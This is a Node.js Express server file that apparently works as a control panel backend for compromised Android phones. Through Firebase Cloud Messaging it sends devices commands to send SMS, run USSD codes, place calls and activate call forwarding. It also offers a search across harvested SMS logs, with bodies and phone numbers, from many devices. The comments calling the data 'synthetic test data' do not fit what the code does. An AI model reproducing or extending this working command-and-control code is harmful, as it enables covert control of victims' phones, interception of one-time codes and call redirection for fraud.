const express = require("express");
const cors = require("cors");
const https = require("https");
const { GoogleAuth } = require("google-auth-library");



const { initializeApp, getApps, cert } = require("firebase-admin/app");

const { getDatabase } = require("firebase-admin/database");
const { getAuth } = require("firebase-admin/auth");



if (getApps().length === 0) {
    const serviceAccountJson = process.env.FIREBASE_SERVICE_ACCOUNT_JSON;

    const databaseURL = process.env.FIREBASE_DATABASE_URL;

    if (!databaseURL) {
        throw new Error("FIREBASE_DATABASE_URL environment variable is required");
    }

    if (serviceAccountJson) {
        const serviceAccount = JSON.parse(serviceAccountJson);

        initializeApp({
            credential: cert(serviceAccount),
            databaseURL
        });
    } else {
        initializeApp({
            databaseURL
        });
    }
}



const database = getDatabase();

const app = express();

app.disable("x-powered-by");

const allowedOrigins = new Set([
    "https://ninjaxpanelxwywkrr6.web.app"
]);

app.use((req, res, next) => {
    res.setHeader("Cache-Control", "no-store");

    const origin = req.headers.origin;

    if (origin && allowedOrigins.has(origin)) {
        res.setHeader("Access-Control-Allow-Origin", origin);
        res.setHeader("Vary", "Origin");
    }

    res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.setHeader(
        "Access-Control-Allow-Headers",
        "Content-Type, Authorization"
    );
    res.setHeader("Access-Control-Max-Age", "86400");

    if (req.method === "OPTIONS") {
        if (origin && !allowedOrigins.has(origin)) {
            return res.status(403).end();
        }

        return res.status(204).end();
    }

    next();
});

app.use(cors({
    origin: [...allowedOrigins],
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
    maxAge: 86400,
    optionsSuccessStatus: 204
}));

app.use(express.json({ limit: "100kb" }));

app.use((req, res, next) => {
    res.setHeader("Content-Type", "application/json; charset=UTF-8");

    if (req.path !== "/health" && req.method !== "POST") {
        return res.status(405).json({
            success: false,
            error: "Only POST requests are allowed"
        });
    }

    next();
});


const googleAuth = new GoogleAuth({
    credentials: process.env.FIREBASE_SERVICE_ACCOUNT_JSON
        ? JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_JSON)
        : undefined,
    scopes: [
        "https://www.googleapis.com/auth/firebase.messaging"
    ]
});


let authClientPromise = null;
let accessTokenCache = null;
let accessTokenExpiry = 0;

async function getAccessToken() {
    const now = Date.now();

    if (accessTokenCache && now < accessTokenExpiry - 60000) {
        return accessTokenCache;
    }

    if (!authClientPromise) {
        authClientPromise = googleAuth.getClient().catch(error => {
            authClientPromise = null;
            throw error;
        });
    }

    const client = await authClientPromise;

    if (
        client.credentials?.access_token &&
        client.credentials.expiry_date &&
        client.credentials.expiry_date > now + 60000
    ) {
        accessTokenCache = client.credentials.access_token;
        accessTokenExpiry = client.credentials.expiry_date;
        return accessTokenCache;
    }

    const result = await client.getAccessToken();

    if (!result.token) {
        accessTokenCache = null;
        accessTokenExpiry = 0;
        throw new Error("Access token unavailable");
    }

    accessTokenCache = result.token;
    accessTokenExpiry =
        client.credentials?.expiry_date || now + 3000000;

    return accessTokenCache;
}

function convertFcmData(data) {
    const result = {};

    for (const [key, value] of Object.entries(data)) {
        if (value === null || value === undefined) {
            result[key] = "";
        } else if (typeof value === "boolean") {
            result[key] = String(value);
        } else if (typeof value === "object") {
            result[key] = JSON.stringify(value);
        } else {
            result[key] = String(value);
        }
    }

    return result;
}

function buildCommandPayload(fcmData) {
    const commandPayload = {
        action: fcmData.action ?? "",
        deviceId: fcmData.deviceId ?? "",
        timestamp: fcmData.timestamp ?? ""
    };

    const action = fcmData.action ?? "";

    const getSimSlot = () => {
        const value = fcmData.simSlot ?? fcmData.sim ?? 0;
        const parsed = Number.parseInt(value, 10);
        return Number.isFinite(parsed) && parsed >= 0 ? parsed : 0;
    };

    if (action === "sms") {
        commandPayload.to = fcmData.to ?? fcmData.number ?? "";
        commandPayload.body = fcmData.body ?? fcmData.message ?? "";
        commandPayload.simSlot = getSimSlot();
        commandPayload.number = fcmData.number ?? commandPayload.to;
        commandPayload.message = fcmData.message ?? commandPayload.body;
        commandPayload.sim = getSimSlot();
        commandPayload.code = fcmData.code ?? "";
    } else if (action === "ussd" || action === "call") {
        commandPayload.code = fcmData.code ?? "";
        commandPayload.simSlot = getSimSlot();
        commandPayload.sim = getSimSlot();
    } else if (action === "call_forwarding_activate") {
        commandPayload.number = fcmData.number ?? "";
        commandPayload.simSlot = getSimSlot();
        commandPayload.sim = getSimSlot();
    } else if (action === "call_forwarding_deactivate") {
        commandPayload.simSlot = getSimSlot();
        commandPayload.sim = getSimSlot();
    }

    const reservedKeys = new Set([
        "type", "payload", "action", "deviceId", "timestamp",
        "to", "body", "number", "message", "simSlot", "sim", "code"
    ]);

    for (const [key, value] of Object.entries(fcmData)) {
        if (!reservedKeys.has(key)) {
            commandPayload[key] = value;
        }
    }

    return commandPayload;
}

const fcmAgent = new https.Agent({
    keepAlive: true,
    maxSockets: 100,
    maxFreeSockets: 20,
    timeout: 60000
});

function sendFcmMessage(projectId, accessToken, message) {
    return new Promise((resolve, reject) => {
        const body = JSON.stringify({ message });

        const target = new URL(
            `https://fcm.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/messages:send`
        );
        const request = https.request({
            hostname: target.hostname,
            path: target.pathname,
            method: "POST",
            agent: fcmAgent,
            headers: {
                Authorization: `Bearer ${accessToken}`,
                "Content-Type": "application/json",
                Accept: "application/json",
                "Content-Length": Buffer.byteLength(body)
            },
            timeout: 20000
        }, response => {
            let responseBody = "";

            response.setEncoding("utf8");

            response.on("data", chunk => {
                responseBody += chunk;
            });

            response.on("end", () => {
                let result;

                try {
                    result = JSON.parse(responseBody);
                } catch {
                    return reject(new Error("Invalid FCM response"));
                }

                if (response.statusCode < 200 || response.statusCode >= 300) {
                    const error = new Error(
                        result.error?.message || "FCM request failed"
                    );

                    error.statusCode = response.statusCode;
                    error.responseData = result;
                    return reject(error);
                }

                resolve({
                    statusCode: response.statusCode,
                    data: result
                });
            });
        });

        request.on("timeout", () => {
            request.destroy(new Error("FCM request timed out"));
        });

        request.on("error", reject);
        request.end(body);
    });
}

app.get("/health", (req, res) => {
    res.json({
        success: true,
        status: "online",
        timestamp: Date.now()
    });
});

app.post("/send-command", async (req, res) => {
    try {
        const input = req.body;

        if (
            !input ||
            typeof input.token !== "string" ||
            !input.token.trim() ||
            !input.data ||
            typeof input.data !== "object" ||
            Array.isArray(input.data)
        ) {
            return res.status(400).json({
                success: false,
                error: "Invalid request. token and data are required."
            });
        }

        
const projectId =
    process.env.FIREBASE_PROJECT_ID ||
    process.env.GCLOUD_PROJECT;


        if (!projectId) {
            throw new Error("Firebase project ID unavailable");
        }

        const fcmData = convertFcmData(input.data);
        fcmData.type = fcmData.type || "DEVICE_COMMAND";

        const commandPayload = buildCommandPayload(fcmData);
        fcmData.payload = JSON.stringify(commandPayload);

        const accessToken = await getAccessToken();

        const result = await sendFcmMessage(
            projectId,
            accessToken,
            {
                token: input.token.trim(),
                data: fcmData
            }
        );

        if (result.data?.name) {
            return res.status(200).json({
                success: true,
                message: "Command accepted by FCM",
                fcm: result.data
            });
        }

        return res.status(502).json({
            success: false,
            error: "FCM did not confirm the request"
        });
    } catch (error) {
        console.error("FCM error:", error.message);

        if (error.responseData) {
            return res.status(error.statusCode || 502).json({
                success: false,
                error: error.responseData.error?.message ||
                    "FCM request failed"
            });
        }

        return res.status(500).json({
            success: false,
            error: "FCM connection or authentication failed"
        });
    }
});



app.post("/search-test-messages", async (req, res) => {
    try {
        // Public dummy-data testing only in Firebase Emulator


        const authorization = req.headers.authorization || "";
        const match = authorization.match(/^Bearer\s+(.+)$/i);

        if (!match) {
            return res.status(401).json({
                success: false,
                error: "Authentication required"
            });
        }

        await getAuth().verifyIdToken(match[1]);

        const search = String(req.body?.query ?? "")
            .trim()
            .toLowerCase();

        if (!search || search.length > 100) {
            return res.status(400).json({
                success: false,
                error: "Valid search query required"
            });
        }

        const cursor = req.body?.cursor ?? null;

        if (cursor !== null && typeof cursor !== "string") {
            return res.status(400).json({
                success: false,
                error: "Invalid cursor"
            });
        }

        const limit = 10;

        // Read synthetic SMS test data
        const snapshot = await database.ref("smsLogs").get();

        if (!snapshot.exists()) {
            return res.status(200).json({
                success: true,
                messages: [],
                nextCursor: null
            });
        }

        const matches = [];

        snapshot.forEach(deviceSnapshot => {
            const deviceId = deviceSnapshot.key;

            deviceSnapshot.forEach(messageSnapshot => {
                const record = messageSnapshot.val();

                if (!record || typeof record !== "object") {
                    return false;
                }

                const messageId = messageSnapshot.key;

                const searchable = [
                    deviceId,
                    messageId,
                    record.body,
                    record.message,
                    record.sender,
                    record.senderNumber,
                    record.receiver,
                    record.receiverNumber
                ]
                    .map(value => String(value ?? "").toLowerCase())
                    .join(" ");

                if (!searchable.includes(search)) {
                    return false;
                }

                matches.push({
                    ...record,
                    id: messageId,
                    deviceId,
                    sender: record.sender ??
                        record.senderNumber ?? "",
                    receiver: record.receiver ??
                        record.receiverNumber ?? "",
                    body: record.body ??
                        record.message ?? "",
                    timestamp: record.timestamp ??
                        record.time ?? ""
                });

                return false;
            });

            return false;
        });

        matches.sort((a, b) => {
            const first = `${a.deviceId}/${a.id}`;
            const second = `${b.deviceId}/${b.id}`;
            return first.localeCompare(second);
        });

        const startIndex = cursor
            ? matches.findIndex(
                item => `${item.deviceId}/${item.id}` === cursor
            ) + 1
            : 0;

        if (cursor && startIndex === 0) {
            return res.status(400).json({
                success: false,
                error: "Invalid or expired cursor"
            });
        }

        const page = matches.slice(
            startIndex,
            startIndex + limit + 1
        );

        const hasMore = page.length > limit;
        const messages = page.slice(0, limit);

        const last = messages[messages.length - 1];

        const nextCursor = hasMore && last
            ? `${last.deviceId}/${last.id}`
            : null;

        return res.status(200).json({
            success: true,
            messages,
            nextCursor
        });

    } catch (error) {
        console.error("Test message search failed:", error);

        if (error.code?.startsWith("auth/")) {
            return res.status(401).json({
                success: false,
                error: "Invalid authentication token"
            });
        }

        return res.status(500).json({
            success: false,
            error: "Search failed"
        });
    }
});


module.exports = app;
